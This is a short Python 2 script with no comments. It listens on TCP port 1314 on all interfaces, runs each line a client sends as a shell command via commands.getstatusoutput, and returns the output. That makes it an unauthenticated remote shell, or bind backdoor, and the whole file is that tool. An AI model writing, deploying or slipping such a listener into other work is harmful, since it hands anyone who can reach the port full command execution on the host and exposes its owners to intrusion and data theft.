#coding: utf-8
import commands
import socket
from threading import Thread

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.bind(("",1314));
s.listen(1);

def clientHandle(c):
    while 1:
        data = c.recv(1024).strip('\n');

        if not data or data == "exit":
            break;

        try:
            err,res = commands.getstatusoutput(data);
            c.send(res);

        except:
            c.send("error!");

    c.close();



try:
    while 1:
        c,ip = s.accept();
        t = Thread(target=clientHandle,  args=(c,))
        t.start()


except KeyboardInterrupt:
    pass